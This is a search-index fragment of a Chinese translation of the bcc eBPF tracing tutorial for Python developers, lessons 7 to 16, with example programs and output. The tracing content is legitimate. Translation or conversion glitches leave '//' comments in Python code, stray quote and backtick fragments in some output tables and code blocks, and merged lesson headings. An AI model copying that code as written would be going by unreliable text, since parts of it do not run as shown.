\u6211\u4eec\u4f7f\u7528\u8bf7\u6c42\u7ed3\u6784\u7684\u6307\u9488\u4f5c\u4e3a\u54c8\u5e0c\u4e2d\u7684\u952e\u3002\u8fd9\u5728\u8ddf\u8e2a\u4e2d\u5f88\u5e38\u89c1\u3002\u7ed3\u6784\u4f53\u6307\u9488\u662f\u975e\u5e38\u597d\u7684\u952e\uff0c\u56e0\u4e3a\u5b83\u4eec\u662f\u552f\u4e00\u7684\uff1a\u4e24\u4e2a\u7ed3\u6784\u4f53\u4e0d\u80fd\u5177\u6709\u76f8\u540c\u7684\u6307\u9488\u5730\u5740\u3002\uff08\u53ea\u9700\u5c0f\u5fc3\u4f55\u65f6\u91ca\u653e\u548c\u91cd\u7528\u6307\u9488\u3002\uff09\u6240\u4ee5\u6211\u4eec\u5b9e\u9645\u4e0a\u662f\u7ed9\u63cf\u8ff0\u78c1\u76d8I/O\u7684\u8bf7\u6c42\u7ed3\u6784\u4f53\u6253\u4e0a\u6211\u4eec\u81ea\u5df1\u7684\u65f6\u95f4\u6233\uff0c\u4ee5\u4fbf\u6211\u4eec\u53ef\u4ee5\u8ba1\u65f6\u3002\u5b58\u50a8\u65f6\u95f4\u6233\u5e38\u7528\u7684\u4e24\u4e2a\u952e\u662f\u7ed3\u6784\u4f53\u6307\u9488\u548c\u7ebf\u7a0bID\uff08\u7528\u4e8e\u8bb0\u5f55\u51fd\u6570\u5165\u53e3\u5230\u8fd4\u56de\u7684\u65f6\u95f4\uff09\u3002</li> <li><code>req-&gt;__data_len</code>: \u6211\u4eec\u5728\u89e3\u5f15\u7528<code>struct request</code>\u7684\u6210\u5458\u3002\u8bf7\u53c2\u9605\u5185\u6838\u6e90\u4ee3\u7801\u4e2d\u5bf9\u5176\u5b9a\u4e49\u7684\u90e8\u5206\u4ee5\u83b7\u5f97\u6709\u5173\u54ea\u4e9b\u6210\u5458\u53ef\u7528\u7684\u4fe1\u606f\u3002bcc\u5b9e\u9645\u4e0a\u4f1a\u5c06\u8fd9\u4e9b\u8868\u8fbe\u5f0f\u91cd\u5199\u4e3a\u4e00\u7cfb\u5217<code>bpf_probe_read_kernel()</code>\u8c03\u7528\u3002\u6709\u65f6bcc\u65e0\u6cd5\u5904\u7406\u590d\u6742\u7684\u89e3\u5f15\u7528\uff0c\u6b64\u65f6\u60a8\u9700\u8981\u76f4\u63a5\u8c03\u7528<code>bpf_probe_read_kernel()</code>\u3002</li> </ol> <p>\u8fd9\u662f\u4e00\u4e2a\u975e\u5e38\u6709\u8da3\u7684\u7a0b\u5e8f\uff0c\u5982\u679c\u60a8\u80fd\u7406\u89e3\u6240\u6709\u7684\u4ee3\u7801\uff0c\u60a8\u5c31\u4f1a\u7406\u89e3\u5f88\u591a\u91cd\u8981\u7684\u57fa\u7840\u77e5\u8bc6\u3002\u6211\u4eec\u4ecd\u7136\u5728\u4f7f\u7528<code>bpf_trace_printk()</code>\u7684\u6280\u5de7\uff0c\u6211\u4eec\u4e0b\u4e00\u6b65\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#lesson-7-hello_perf_outputpy","title":"Lesson 7. hello_perf_output.py","text":"<p>\u8ba9\u6211\u4eec\u6700\u7ec8\u505c\u6b62\u4f7f\u7528bpf_trace_printk()\uff0c\u5e76\u4f7f\u7528\u9002\u5f53\u7684BPF_PERF_OUTPUT()\u63a5\u53e3\u3002\u8fd9\u4e5f\u610f\u5473\u7740\u6211\u4eec\u5c06\u505c\u6b62\u83b7\u53d6\u514d\u8d39\u7684trace_field()\u6210\u5458\uff0c\u5982PID\u548c\u65f6\u95f4\u6233\uff0c\u5e76\u4e14\u9700\u8981\u76f4\u63a5\u83b7\u53d6\u5b83\u4eec\u3002\u5728\u53e6\u4e00\u4e2a\u4f1a\u8bdd\u4e2d\u8fd0\u884c\u547d\u4ee4\u65f6\u7684\u793a\u4f8b\u8f93\u51fa</p> <pre><code># hello_perf_output.py\nTIME(s)            COMM             PID    MESSAGE\n0.000000000        bash             22986  \u4f60\u597d\uff0cperf_output\uff01\n0.021080275        systemd-udevd    484    \u4f60\u597d\uff0cperf_output\uff01\n0.021359520        systemd-udevd    484    \u4f60\u597d\uff0cperf_output\uff01\n0.021590610        systemd-udevd    484    \u4f60\u597d\uff0cperf_output\uff01\n[...]\n</code></pre> <p>\u4ee3\u7801\u4f4d\u4e8eexamples/tracing/hello_perf_output.py\uff1a</p> <pre><code>from bcc import BPF\n\n// \u5b9a\u4e49BPF\u7a0b\u5e8f\nprog = \"\"\"\n#include &lt;linux/sched.h&gt;\n\n// \u5728C\u4e2d\u5b9a\u4e49\u8f93\u51fa\u6570\u636e\u7ed3\u6784\nstruct data_t {\n    u32 pid;\n    u64 ts;\n    char comm[TASK_COMM_LEN];\n};\nBPF_PERF_OUTPUT(events);\n\nint hello(struct pt_regs *ctx) {\n    struct data_t data = {};\n\n    data.pid = bpf_get_current_pid_tgid();\n    data.ts = bpf_ktime_get_ns();\n    bpf_get_current_comm(&amp;data.comm, sizeof(data.comm));\n\n    events.perf_submit(ctx, &amp;data, sizeof(data));\n\n    return 0;\n}\n\"\"\"\n\n// \u52a0\u8f7dBPF\u7a0b\u5e8f\nb = BPF(text=prog)\nb.attach_kprobe(event=b.get_syscall_fnname(\"clone\"), fn_name=\"hello\")\n\n//\u6807\u9898\nprint(\"%-18s %-16s %-6s %s\" % (\"TIME(s)\", \"COMM\", \"PID\", \"MESSAGE\"))\n\n//\u5904\u7406\u4e8b\u4ef6\nstart = 0\ndef print_event(cpu, data, size):\n    global start\n    event = b[\"events\"].event(data)\n    if start == 0:\n            start = event.ts\n    time_s = (float(event.ts - start)) / 1000000000\n    print(\"%-18.9f %-16s %-6d %s\" % (time_s, event.comm, event.pid, \"\u4f60\u597d\uff0cperf_output\uff01\"))\n\n//\u5faa\u73af\u5e76\u56de\u8c03print_event\nb[\"events\"].open_perf_buffer(print_event)\nwhile 1:\n    b.perf_buffer_poll()\n</code></pre> <p>\u5b66\u4e60\u7684\u5185\u5bb9\uff1a</p> <ol> <li><code>struct data_t</code>: \u8fd9\u5b9a\u4e49\u4e86\u4e00\u4e2aC\u7ed3\u6784\u4f53\uff0c\u6211\u4eec\u5c06\u7528\u5b83\u6765\u4ece\u5185\u6838\u4f20\u9012\u6570\u636e\u5230\u7528\u6237\u7a7a\u95f4\u30021. <code>BPF_PERF_OUTPUT(events)</code>: \u8fd9\u91cc\u7ed9\u6211\u4eec\u7684\u8f93\u51fa\u901a\u9053\u547d\u540d\u4e3a\"events\"\u3002</li> <li><code>struct data_t data = {};</code>: \u521b\u5efa\u4e00\u4e2a\u7a7a\u7684<code>data_t</code>\u7ed3\u6784\u4f53\uff0c\u6211\u4eec\u5c06\u5728\u4e4b\u540e\u586b\u5145\u5b83\u3002</li> <li><code>bpf_get_current_pid_tgid()</code>: \u8fd4\u56de\u4f4e32\u4f4d\u7684\u8fdb\u7a0bID\uff08\u5185\u6838\u89c6\u56fe\u4e2d\u7684PID\uff0c\u7528\u6237\u7a7a\u95f4\u4e2d\u901a\u5e38\u88ab\u8868\u793a\u4e3a\u7ebf\u7a0bID\uff09\uff0c\u4ee5\u53ca\u9ad832\u4f4d\u7684\u7ebf\u7a0b\u7ec4ID\uff08\u7528\u6237\u7a7a\u95f4\u901a\u5e38\u8ba4\u4e3a\u662fPID\uff09\u3002\u901a\u8fc7\u76f4\u63a5\u5c06\u5176\u8bbe\u7f6e\u4e3a<code>u32</code>\uff0c\u6211\u4eec\u4e22\u5f03\u4e86\u9ad832\u4f4d\u3002\u5e94\u8be5\u663e\u793aPID\u8fd8\u662fTGID\uff1f\u5bf9\u4e8e\u591a\u7ebf\u7a0b\u5e94\u7528\u7a0b\u5e8f\uff0cTGID\u5c06\u662f\u76f8\u540c\u7684\uff0c\u6240\u4ee5\u5982\u679c\u4f60\u60f3\u8981\u533a\u5206\u5b83\u4eec\uff0c\u4f60\u9700\u8981PID\u3002\u8fd9\u4e5f\u662f\u5bf9\u6700\u7ec8\u7528\u6237\u671f\u671b\u7684\u4e00\u4e2a\u95ee\u9898\u3002</li> <li><code>bpf_get_current_comm()</code>: \u5c06\u5f53\u524d\u8fdb\u7a0b\u7684\u540d\u79f0\u586b\u5145\u5230\u7b2c\u4e00\u4e2a\u53c2\u6570\u7684\u5730\u5740\u4e2d\u3002</li> <li><code>events.perf_submit()</code>: \u901a\u8fc7perf\u73af\u5f62\u7f13\u51b2\u533a\u5c06\u4e8b\u4ef6\u63d0\u4ea4\u7ed9\u7528\u6237\u7a7a\u95f4\u4ee5\u4f9b\u8bfb\u53d6\u3002</li> <li><code>def print_event()</code>: \u5b9a\u4e49\u4e00\u4e2aPython\u51fd\u6570\u6765\u5904\u7406\u4ece<code>events</code>\u6d41\u4e2d\u8bfb\u53d6\u7684\u4e8b\u4ef6\u3002</li> <li><code>b[\"events\"].event(data)</code>: \u73b0\u5728\u5c06\u4e8b\u4ef6\u4f5c\u4e3a\u4e00\u4e2aPython\u5bf9\u8c61\u83b7\u53d6\uff0c\u8be5\u5bf9\u8c61\u662f\u6839\u636eC\u58f0\u660e\u81ea\u52a8\u751f\u6210\u7684\u3002</li> <li><code>b[\"events\"].open_perf_buffer(print_event)</code>: \u5c06Python\u7684<code>print_event</code>\u51fd\u6570\u4e0e<code>events</code>\u6d41\u5173\u8054\u8d77\u6765\u3002</li> <li><code>while 1: b.perf_buffer_poll()</code>: \u963b\u585e\u7b49\u5f85\u4e8b\u4ef6\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#sync_perf_outputpy","title":"\u7b2c\u516b\u8bfe\u3002 sync_perf_output.py","text":"<p>\u91cd\u5199\u4e4b\u524d\u7684\u8bfe\u7a0b\u4e2d\u7684sync_timing.py\uff0c\u4f7f\u7528<code>BPF_PERF_OUTPUT</code>\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#bitehistpy","title":"\u7b2c\u4e5d\u8bfe\u3002 bitehist.py","text":"<p>\u4ee5\u4e0b\u5de5\u5177\u8bb0\u5f55\u4e86\u78c1\u76d8I/O\u5927\u5c0f\u7684\u76f4\u65b9\u56fe\u3002\u6837\u672c\u8f93\u51fa\uff1a</p> <pre><code># bitehist.py\n\u8ddf\u8e2a\u4e2d... \u6309Ctrl-C\u7ed3\u675f\u3002\n^C\n     kbytes          : count     distribution\n       0 -&gt; 1        : 3        |                                      |\n       2 -&gt; 3        : 0        |                                      |\n       4 -&gt; 7        : 211      |**********                            |\n       8 -&gt; 15       : 0        |                                      |\n      16 -&gt; 31       : 0        |                                      |\".32 -&gt; 63       : 0        |                                      |\n      64 -&gt; 127      : 1        |                                      |\n     128 -&gt; 255      : 800      |**************************************|\n</code></pre> <p>\u4ee3\u7801\u5728examples/tracing/bitehist.py:</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\nfrom time import sleep\n\n# \u52a0\u8f7dBPF\u7a0b\u5e8f\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n#include &lt;linux/blkdev.h&gt;\n\nBPF_HISTOGRAM(dist);\n\nint kprobe__blk_account_io_done(struct pt_regs *ctx, struct request *req)\n{\n dist.increment(bpf_log2l(req-&gt;__data_len / 1024));\n return 0;\n}\n\"\"\")\n\n# \u5934\u90e8\nprint(\"\u8ddf\u8e2a\u4e2d... \u6309Ctrl-C\u7ed3\u675f.\")\n\n# \u8ddf\u8e2a\u76f4\u5230\u6309\u4e0bCtrl-C\ntry:\n sleep(99999999)\nexcept KeyboardInterrupt:\n print()\n\n# \u8f93\u51fa\nb[\"dist\"].print_log2_hist(\"kbytes\")\n</code></pre> <p>\u4e4b\u524d\u8bfe\u7a0b\u7684\u603b\u7ed3\uff1a</p> <ul> <li><code>kprobe__</code>: \u8fd9\u4e2a\u524d\u7f00\u610f\u5473\u7740\u5176\u4f59\u90e8\u5206\u5c06\u88ab\u89c6\u4e3a\u4e00\u4e2a\u5c06\u4f7f\u7528kprobe\u8fdb\u884c\u63d2\u6869\u7684\u5185\u6838\u51fd\u6570\u540d\u3002</li> <li><code>struct pt_regs *ctx, struct request*req</code>: kprobe\u7684\u53c2\u6570\u3002<code>ctx</code> \u662f\u5bc4\u5b58\u5668\u548cBPF\u4e0a\u4e0b\u6587\uff0c<code>req</code> \u662f\u88ab\u63d2\u6869\u51fd\u6570 <code>blk_account_io_done()</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u3002</li> <li><code>req-&gt;__data_len</code>: \u89e3\u5f15\u7528\u8be5\u6210\u5458\u3002</li> </ul> <p>\u65b0\u77e5\u8bc6\uff1a</p> <ol> <li><code>BPF_HISTOGRAM(dist)</code>: \u5b9a\u4e49\u4e86\u4e00\u4e2a\u540d\u4e3a \"dist\" \u7684BPF\u6620\u5c04\u5bf9\u8c61\uff0c\u5b83\u662f\u4e00\u4e2a\u76f4\u65b9\u56fe\u3002</li> <li><code>dist.increment()</code>: \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5c06\u7b2c\u4e00\u4e2a\u53c2\u6570\u63d0\u4f9b\u7684\u76f4\u65b9\u56fe\u6876\u7d22\u5f15\u52a01\u3002\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4f20\u9012\u81ea\u5b9a\u4e49\u7684\u589e\u91cf\u3002</li> <li><code>bpf_log2l()</code>: \u8fd4\u56de\u6240\u63d0\u4f9b\u503c\u7684\u5bf9\u6570\u503c\u3002\u8fd9\u5c06\u6210\u4e3a\u6211\u4eec\u76f4\u65b9\u56fe\u7684\u7d22\u5f15\uff0c\u8fd9\u6837\u6211\u4eec\u6784\u5efa\u4e86\u4e00\u4e2a\u4ee52\u4e3a\u5e95\u7684\u5e42\u76f4\u65b9\u56fe\u3002</li> <li><code>b[\"dist\"].print_log2_hist(\"kbytes\")</code>: \u4ee52\u4e3a\u5e95\u7684\u5e42\u5f62\u5f0f\u6253\u5370 \"dist\" \u76f4\u65b9\u56fe\uff0c\u5217\u6807\u9898\u4e3a \"kbytes\"\u3002\u8fd9\u6837\u53ea\u6709\u6876\u8ba1\u6570\u4ece\u5185\u6838\u4f20\u8f93\u5230\u7528\u6237\u7a7a\u95f4\uff0c\u56e0\u6b64\u6548\u7387\u9ad8\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#lesson-10-disklatencypy-lesson-11-vfsreadlatpy","title":"Lesson 10. disklatency.py\u201d\u3002#### Lesson 11. vfsreadlat.py","text":"<p>\u8fd9\u4e2a\u4f8b\u5b50\u5206\u4e3a\u72ec\u7acb\u7684Python\u548cC\u6587\u4ef6\u3002\u793a\u4f8b\u8f93\u51fa\uff1a</p> <pre><code># vfsreadlat.py 1\n\u8ddf\u8e2a\u4e2d... \u6309Ctrl-C\u505c\u6b62\u3002\n     \u5fae\u79d2               : \u6570\u91cf     \u5206\u5e03\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 2        |***********                             |\n         4 -&gt; 7          : 7        |****************************************|\n         8 -&gt; 15         : 4        |**********************                  |\n\n     \u5fae\u79d2               : \u6570\u91cf     \u5206\u5e03\n         0 -&gt; 1          : 29       |****************************************|\n         2 -&gt; 3          : 28       |**************************************  |\n         4 -&gt; 7          : 4        |*****                                   |\n         8 -&gt; 15         : 8        |***********                             |\n        16 -&gt; 31         : 0        |                                        |\n        32 -&gt; 63         : 0        |                                        |\n        64 -&gt; 127        : 0        |                                        |\n       128 -&gt; 255        : 0        |                                        |\n       256 -&gt; 511        : 2        |**                                      |\n       512 -&gt; 1023       : 0        |                                        |\n      1024 -&gt; 2047       : 0        |                                        |\n      2048 -&gt; 4095       : 0        |                                        |\n      4096 -&gt; 8191       : 4        |*****                                   |\n      8192 -&gt; 16383      : 6        |********                                |\n     16384 -&gt; 32767      : 9        |************                            |```.32768 -&gt; 65535      : 6        |********                                |\n     65536 -&gt; 131071     : 2        |**                                      |\n\n     usecs               : count     distribution\n         0 -&gt; 1          : 11       |****************************************|\n         2 -&gt; 3          : 2        |*******                                 |\n         4 -&gt; 7          : 10       |************************************    |\n         8 -&gt; 15         : 8        |*****************************           |\n        16 -&gt; 31         : 1        |***                                     |\n        32 -&gt; 63         : 2        |*******                                 |\n[...]\n</code></pre> <p>\u6d4f\u89c8 examples/tracing/vfsreadlat.py \u548c examples/tracing/vfsreadlat.c \u4e2d\u7684\u4ee3\u7801\u3002</p> <p>\u5b66\u4e60\u7684\u5185\u5bb9:</p> <ol> <li><code>b = BPF(src_file = \"vfsreadlat.c\")</code>: \u4ece\u5355\u72ec\u7684\u6e90\u4ee3\u7801\u6587\u4ef6\u4e2d\u8bfb\u53d6 BPF C \u7a0b\u5e8f\u3002</li> <li><code>b.attach_kretprobe(event=\"vfs_read\", fn_name=\"do_return\")</code>: \u5c06 BPF C \u51fd\u6570 <code>do_return()</code> \u94fe\u63a5\u5230\u5185\u6838\u51fd\u6570 <code>vfs_read()</code> \u7684\u8fd4\u56de\u503c\u4e0a\u3002\u8fd9\u662f\u4e00\u4e2a kretprobe\uff1a\u7528\u4e8e\u68c0\u6d4b\u51fd\u6570\u8fd4\u56de\u503c\uff0c\u800c\u4e0d\u662f\u51fd\u6570\u7684\u5165\u53e3\u3002</li> <li><code>b[\"dist\"].clear()</code>: \u6e05\u9664\u76f4\u65b9\u56fe\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#lesson-12-urandomreadpy","title":"Lesson 12. urandomread.py","text":"<p>\u5f53\u8fd0\u884c <code>dd if=/dev/urandom of=/dev/null bs=8k count=5</code> \u65f6\u8fdb\u884c\u8ddf\u8e2a\uff1a</p> <pre><code># urandomread.py\nTIME(s)            COMM             PID    GOTBITS\n24652832.956994001 smtp             24690  384\n24652837.726500999 dd               24692  65536\n24652837.727111001 dd               24692  65536\n24652837.727703001 dd               24692  65536\n24652837.728294998 dd               24692  65536\n24652837.728888001 dd               24692  65536\n</code></pre> <p>\u54c8\uff01\u6211\u610f\u5916\u5730\u6355\u6349\u5230\u4e86 smtp\u3002\u4ee3\u7801\u5728 examples/tracing/urandomread.py \u4e2d\uff1a</p> <pre><code>from __future__ import print_function\".```python\nfrom bcc import BPF\n\n# \u52a0\u8f7dBPF\u7a0b\u5e8f\nb = BPF(text=\"\"\"\nTRACEPOINT_PROBE(random, urandom_read) {\n    // args is from /sys/kernel/debug/tracing/events/random/urandom_read/format\n    bpf_trace_printk(\"%d\\\\n\", args-&gt;got_bits);\n    return 0;\n}\n\"\"\")\n\n# header\nprint(\"%-18s %-16s %-6s %s\" % (\"TIME(s)\", \"COMM\", \"PID\", \"GOTBITS\"))\n\n# format output\nwhile 1:\n    try:\n        (task, pid, cpu, flags, ts, msg) = b.trace_fields()\n    except ValueError:\n        continue\n    print(\"%-18.9f %-16s %-6d %s\" % (ts, task, pid, msg))\n</code></pre> <p>\u8981\u5b66\u5230\u7684\u4e1c\u897f\uff1a</p> <ol> <li><code>TRACEPOINT_PROBE(random, urandom_read)</code>: \u5bf9\u5185\u6838\u8ddf\u8e2a\u70b9 <code>random:urandom_read</code> \u8fdb\u884c\u6ce8\u5165\u3002\u8fd9\u4e9b\u5177\u6709\u7a33\u5b9a\u7684API\uff0c\u56e0\u6b64\u5728\u53ef\u80fd\u7684\u60c5\u51b5\u4e0b\u5efa\u8bae\u4f7f\u7528\u5b83\u4eec\u6765\u4ee3\u66ffkprobe\u3002\u60a8\u53ef\u4ee5\u8fd0\u884c <code>perf list</code> \u6765\u83b7\u53d6\u8ddf\u8e2a\u70b9\u5217\u8868\u3002\u81f3\u5c11\u9700\u8981 Linux \u7248\u672c 4.7 \u6765\u5c06 BPF \u7a0b\u5e8f\u9644\u52a0\u5230\u8ddf\u8e2a\u70b9\u4e0a\u3002</li> <li><code>args-&gt;got_bits</code>: <code>args</code> \u662f\u81ea\u52a8\u586b\u5145\u7684\u8ddf\u8e2a\u70b9\u53c2\u6570\u7ed3\u6784\u3002\u4e0a\u9762\u7684\u6ce8\u91ca\u6307\u51fa\u4e86\u53ef\u4ee5\u67e5\u770b\u8fd9\u4e2a\u7ed3\u6784\u7684\u4f4d\u7f6e\u3002\u4f8b\u5982\uff1a</li> </ol> <pre><code># cat /sys/kernel/debug/tracing/events/random/urandom_read/format\nname: urandom_read\nID: 972\nformat:\n field:unsigned short common_type; offset:0; size:2; signed:0;\n field:unsigned char common_flags; offset:2; size:1; signed:0;\n field:unsigned char common_preempt_count; offset:3; size:1; signed:0;\n field:int common_pid; offset:4; size:4; signed:1;\n\n field:int got_bits; offset:8; size:4; signed:1;\n field:int pool_left; offset:12; size:4; signed:1;\n field:int input_left; offset:16; size:4; signed:1;\n\nprint fmt: \"got_bits %d nonblocking_pool_entropy_left %d input_entropy_left %d\", REC-&gt;got_bits, REC-&gt;pool_left, REC-&gt;input_left\n</code></pre> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u6b63\u5728\u6253\u5370 <code>got_bits</code> \u6210\u5458\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#13-disksnooppy","title":"\u7b2c13\u8bfe. disksnoop.py\u5df2\u4fee\u590d","text":"<p>\u5c06\u4e0a\u4e00\u8bfe\u7684 disksnoop.py \u4fee\u6539\u4e3a\u4f7f\u7528 <code>block:block_rq_issue</code> \u548c <code>block:block_rq_complete</code> \u8ddf\u8e2a\u70b9\u3002</p>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#14-strlen_countpy","title":"\u7b2c14\u8bfe. strlen_count.py.","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u5bf9\u7528\u6237\u7ea7\u51fd\u6570\u8fdb\u884c\u63d2\u6869\uff0c\u5176\u4e2d\u5305\u62ec <code>strlen()</code> \u5e93\u51fd\u6570\uff0c\u5e76\u5bf9\u5176\u5b57\u7b26\u4e32\u53c2\u6570\u8fdb\u884c\u9891\u7387\u7edf\u8ba1\u3002\u4f8b\u5982\u8f93\u51fa</p> <pre><code># strlen_count.py\n\u8ddf\u8e2a strlen()... \u6309 Ctrl-C \u7ed3\u675f\u3002\n^C     \u6570\u91cf \u5b57\u7b26\u4e32\n         1 \" \"\n         1 \"/bin/ls\"\n         1 \".\"\n         1 \"cpudist.py.1\"\n         1 \".bashrc\"\n         1 \"ls --color=auto\"\n         1 \"key_t\"\n[...]\n        10 \"a7:~# \"\n        10 \"/root\"\n        12 \"LC_ALL\"\n        12 \"en_US.UTF-8\"\n        13 \"en_US.UTF-8\"\n        20 \"~\"\n        70 \"#%^,~:-=?+/}\"\n       340 \"\\x01\\x1b]0;root@bgregg-test: ~\\x07\\x02root@bgregg-test:~# \"\n</code></pre> <p>\u8fd9\u4e9b\u662f\u5728\u8ddf\u8e2a\u65f6\u7531\u6b64\u5e93\u51fd\u6570\u5904\u7406\u7684\u5404\u79cd\u5b57\u7b26\u4e32\u4ee5\u53ca\u5b83\u4eec\u7684\u9891\u7387\u8ba1\u6570\u3002\u4f8b\u5982\uff0c\"LC_ALL\" \u88ab\u8c03\u7528\u4e8612\u6b21\u3002</p> <p>\u4ee3\u7801\u5728 examples/tracing/strlen_count.py \u4e2d\uff1a</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF\nfrom time import sleep\n\n# \u8f7d\u5165 BPF \u7a0b\u5e8f\nb = BPF(text=\"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\n\nstruct key_t {\n    char c[80];\n};\nBPF_HASH(counts, struct key_t);\n\nint count(struct pt_regs *ctx) {\n    if (!PT_REGS_PARM1(ctx))\n        return 0;\n\n    struct key_t key = {};\n    u64 zero = 0, *val;\n\n    bpf_probe_read_user(&amp;key.c, sizeof(key.c), (void *)PT_REGS_PARM1(ctx));\n    // \u4e5f\u53ef\u4ee5\u4f7f\u7528 `counts.increment(key)`\n    val = counts.lookup_or_try_init(&amp;key, &amp;zero);\n    if (val) {\n      (*val)++;\n    }\n    return 0;\n};\n\"\"\")\nb.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")\n\n# \u5934\u90e8\nprint(\"\u8ddf\u8e2a strlen()... \u6309 Ctrl-C \u7ed3\u675f\u3002\")\n\n# \u7761\u7720\u76f4\u5230\u6309\u4e0b Ctrl-C\ntry:\n    sleep(99999999)\nexcept KeyboardInterrupt:\n    pass\n\n# \u6253\u5370\u8f93\u51fa\nprint(\"%10s %s\" % (\"\u6570\u91cf\", \"\u5b57\u7b26\u4e32\"))\ncounts = b.get_table(\"counts\")\nfor k, v in sorted(counts.items(), key=lambda counts: counts[1].value):\n    print(\"%10d \\\"%s\\\"\" % (v.value, k.c.encode('string-escape')))\n</code></pre> <p>\u8981\u5b66\u4e60\u7684\u5185\u5bb9\uff1a1. <code>PT_REGS_PARM1(ctx)</code>: \u8fd9\u4e2a\u53c2\u6570\u4f1a\u83b7\u53d6\u4f20\u9012\u7ed9 <code>strlen()</code> \u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\uff0c\u4e5f\u5c31\u662f\u5b57\u7b26\u4e32\u3002</p> <ol> <li><code>b.attach_uprobe(name=\"c\", sym=\"strlen\", fn_name=\"count\")</code>: \u9644\u52a0\u5230\u5e93 \"c\"\uff08\u5982\u679c\u8fd9\u662f\u4e3b\u7a0b\u5e8f\uff0c\u5219\u4f7f\u7528\u5176\u8def\u5f84\u540d\uff09\uff0c\u5bf9\u7528\u6237\u7ea7\u51fd\u6570 <code>strlen()</code> \u8fdb\u884c\u63d2\u88c5\uff0c\u5e76\u5728\u6267\u884c\u65f6\u8c03\u7528\u6211\u4eec\u7684 C \u51fd\u6570 <code>count()</code>\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#15nodejs_http_serverpy","title":"\u7b2c15\u8bfe\u3002nodejs_http_server.py","text":"<p>\u672c\u7a0b\u5e8f\u4f1a\u5bf9\u7528\u6237\u9759\u6001\u5b9a\u4e49\u7684\u8ddf\u8e2a (USDT) \u63a2\u6d4b\u70b9\u8fdb\u884c\u63d2\u88c5\uff0c\u8fd9\u662f\u5185\u6838\u8ddf\u8e2a\u70b9\u7684\u7528\u6237\u7ea7\u7248\u672c\u3002\u793a\u4f8b\u8f93\u51fa\uff1a</p> <pre><code># nodejs_http_server.py 24728\nTIME(s)            COMM             PID    ARGS\n24653324.561322998 node             24728  path:/index.html\n24653335.343401998 node             24728  path:/images/welcome.png\n24653340.510164998 node             24728  path:/images/favicon.png\n</code></pre> <p>\u6765\u81ea examples/tracing/nodejs_http_server.py \u7684\u76f8\u5173\u4ee3\u7801\uff1a</p> <pre><code>from __future__ import print_function\nfrom bcc import BPF, USDT\nimport sys\n\nif len(sys.argv) &lt; 2:\n    print(\"USAGE: nodejs_http_server PID\")\n    exit()\npid = sys.argv[1]\ndebug = 0\n\n# load BPF program\nbpf_text = \"\"\"\n#include &lt;uapi/linux/ptrace.h&gt;\nint do_trace(struct pt_regs *ctx) {\n    uint64_t addr;\n    char path[128]={0};\n    bpf_usdt_readarg(6, ctx, &amp;addr);\n    bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr);\n    bpf_trace_printk(\"path:%s\\\\n\", path);\n    return 0;\n};\n\"\"\"\n\n# enable USDT probe from given PID\nu = USDT(pid=int(pid))\nu.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")\nif debug:\n    print(u.get_text())\n    print(bpf_text)\n\n# initialize BPF\nb = BPF(text=bpf_text, usdt_contexts=[u])\n</code></pre> <p>\u5b66\u4e60\u5185\u5bb9\uff1a</p> <ol> <li><code>bpf_usdt_readarg(6, ctx, &amp;addr)</code>: \u4ece USDT \u63a2\u6d4b\u70b9\u4e2d\u8bfb\u53d6\u53c2\u6570 6 \u7684\u5730\u5740\u5230 <code>addr</code>\u3002</li> <li><code>bpf_probe_read_user(&amp;path, sizeof(path), (void *)addr)</code>: \u73b0\u5728\u5b57\u7b26\u4e32 <code>addr</code> \u6307\u5411\u6211\u4eec\u7684 <code>path</code> \u53d8\u91cf\u3002</li> <li><code>u = USDT(pid=int(pid))</code>: \u4e3a\u7ed9\u5b9a\u7684 PID \u521d\u59cb\u5316 USDT \u8ddf\u8e2a\u30021. <code>u.enable_probe(probe=\"http__server__request\", fn_name=\"do_trace\")</code>: \u5c06\u6211\u4eec\u7684 <code>do_trace()</code> BPF C \u51fd\u6570\u9644\u52a0\u5230 Node.js \u7684 <code>http__server__request</code> USDT \u63a2\u9488\u3002</li> <li><code>b = BPF(text=bpf_text, usdt_contexts=[u])</code>: \u9700\u8981\u5c06\u6211\u4eec\u7684 USDT \u5bf9\u8c61 <code>u</code> \u4f20\u9012\u7ed9 BPF \u5bf9\u8c61\u7684\u521b\u5efa\u3002</li> </ol>"},{"location":"tutorials/bcc-documents/tutorial_bcc_python_developer/#16-task_switchc","title":"\u7b2c16\u8bfe. task_switch.c","text":"<p>\u8fd9\u662f\u4e00\u4e2a\u65e9\u671f\u7684\u6559\u7a0b\uff0c\u4f5c\u4e3a\u989d\u5916\u7684\u8bfe\u7a0b\u5305\u542b\u5176\u4e2d\u3002\u7528\u5b83\u6765\u590d\u4e60\u548c\u52a0\u6df1\u4f60\u5df2\u7ecf\u5b66\u5230\u7684\u5185\u5bb9\u3002</p> <p>\u8fd9\u662f\u4e00\u4e2a\u6bd4 Hello World 